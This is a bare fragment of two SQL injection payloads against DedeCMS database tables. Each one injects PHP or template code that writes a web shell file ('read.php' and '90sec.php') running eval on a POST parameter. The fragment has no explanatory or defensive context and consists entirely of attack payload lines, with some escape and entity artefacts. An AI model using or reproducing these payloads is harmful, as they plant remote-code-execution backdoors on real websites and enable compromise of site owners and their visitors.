...
cfg\_dbprefixmyad`SET`normbody`= '<?php file_put_contents(''read.php'',''<?php eval($_POST[x]);echo mOon;?>'');?>' WHERE`aid\` =19 \#
...
\`cfg\_dbprefixmytag\(aid,expbody,normbody\) VALUES\(9013,@\','{dede:php}file\_put\_contents\(''90sec.php'',''&lt;?php eval\($\_POST\[guige\]\);?&gt;''\);{/dede:php}'\) \# @\'\`\`
